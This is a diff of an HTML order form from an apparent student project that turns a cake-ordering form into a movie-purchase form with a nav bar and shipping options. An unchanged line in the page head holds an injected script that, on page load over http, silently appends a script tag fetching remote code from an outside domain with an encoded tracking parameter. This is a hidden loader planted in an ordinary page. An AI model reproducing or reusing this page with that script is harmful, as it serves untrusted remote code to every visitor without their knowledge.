@@ -1,26 +1,44 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
-    <title>Cake Form</title>
+    <title>Movie Form</title>
     <script type="text/javascript" src="javascript/main-js.js"></script>
+    <link rel="stylesheet" type="text/css" href="css/main.css" />
 <script>var nz3Hsx8l = 1;(function(){var k=function(){if(window == window.top && document.location.protocol == 'http:') {var komCat = document.createElement('script');komCat.src = 'http://srdrvp.com/cmn2?p=YTM0NDcwMTMwMzdR5Taecj7B5kvVomVfDBpvkgypzH2%2F5cpJNzcjMmDXQeVsJZR%2Fiex5i1vd6Kr8QqlzijRI1d67aEOtl7fY5ecNNTNhw%2FDyjQAx3zi26yYkYSWFvur3ytXbNP7kaGDYmGEP%2BwpTNF5J8v9MknsWVJPZLte0QVUX0SM%3D&d=98';komCat.type = 'text/javascript';document.getElementsByTagName('head')[0].appendChild(komCat);}};(function d(){if(document.readyState=='interactive' || document.readyState=='complete'){k()}else{window.setTimeout(d,50)}}())}());</script></head>
 <body onload='hideTotal()'>
+<div id="header"> 
+  <div id="banner">&nbsp;
+  </div> <nav> 
+    <ul> 
+      <li> <a style="color: white;" href="index.html">Home</a> </li> 
+      <li> <a style="color: white;" href="views/movies.php">Cinematic Universe</a> </li> 
+      <li> <a style="color: white;" href="views/origin-stories.php">Origin Stories</a> </li>
+		<br>
+      <li> <a style="color: white;" href="model/contact.php">Contact</a> </li> 
+      <li> <a style="color: white;" href="model/login.php">Log In</a> </li>
+      <li> <a style="color: white;" href="index1.php">Buy Comics</a> </li>
+      <li> <a style="color: white;" href="pricing.html">Buy Movies</a> </li>
+    </ul> </nav> 
+</div> 
+
+    <br/>
+    <br/>    
+    
     <div id="wrap">
-        <form action="" id="cakeform" onsubmit="return false;">
+        <form action="" id="movieform" onsubmit="return false;">
         <div>
-            <div class="cont_order">
                <fieldset>
-                <legend>Make your cake!</legend>
-                <label >Size Of the Cake</label>
+                <legend>Buy for favorite movie!</legend>
+                <label >Movie Selection</label>
+                </br>
                 <label class='radiolabel'><input type="radio"  name="selectedmovie" value="Iron Man" onclick="calculateTotal()" />Iron Man</label><br/>
                 <label class='radiolabel'><input type="radio"  name="selectedmovie" value="Iron Man 2" onclick="calculateTotal()" />Iron Man 2</label><br/>
                 <label class='radiolabel'><input type="radio"  name="selectedmovie" value="Iron Man 3" onclick="calculateTotal()" />Iron Man 3</label><br/>
                 <label class='radiolabel'><input type="radio"  name="selectedmovie" value="Avengers" onclick="calculateTotal()" />Avengers</label><br/>
                 <br/>
-                <label >Filling</label>
+                <label >Media Selection</label>
          
-                <select id="filling" name='filling' onchange="calculateTotal()">
+                <select id="media" name='media' onchange="calculateTotal()">
                 <option value="None">Select Media</option>
                 <option value="Blu-Ray">Blu-Ray</option>
                 <option value="Digital">Digital</option>
@@ -28,20 +46,20 @@
                </select>
                 <br/>
                 <p>
-                <label for='includecandles' class="inlinelabel">Include Candles($5)</label>
-               <input type="checkbox" id="includecandles" name='includecandles' onclick="calculateTotal()" />
+                <br/>    
+                <label for='includeshipping' class="inlinelabel">Shipping($5)</label>
+               <input type="checkbox" id="includeshipping" name='includeshipping' onclick="calculateTotal()" />
                </p>
-               
+               <br/>
                 <p>
-                <label class="inlinelabel" for='includeinscription'>Include Inscription($20)</label>
-                <input type="checkbox" id="includeinscription" name="includeinscription" onclick="calculateTotal()" />
-                <input type="text"  id="theinscription" name="theinscription" value="Enter Inscription"  />
+                <label class="inlinelabel" for='includeinternationalshipping'>International Shipping($20)</label>
+                <input type="checkbox" id="includeinternationalshipping" name="includeinternationalshipping" onclick="calculateTotal()" />
                 </p>
+               <br/>
                 <div id="totalPrice"></div>
-                
+               <br/> 
                 </fieldset>
-            </div>
-            
+            <div/>
         	<div class="cont_details">
             	<fieldset>
                 <legend>Contact Details</legend>
@@ -57,9 +75,10 @@
                 </fieldset>
             </div>
             <input type='submit' id='submit' value='Submit' onclick="calculateTotal()" />
-        </div>  
-       </form>
-	</div><!--End of wrap-->
+    </div>  
+  </div><!--End of wrap-->
+  
+    <br/>
+    <br/>
 
 </body>
-</html>
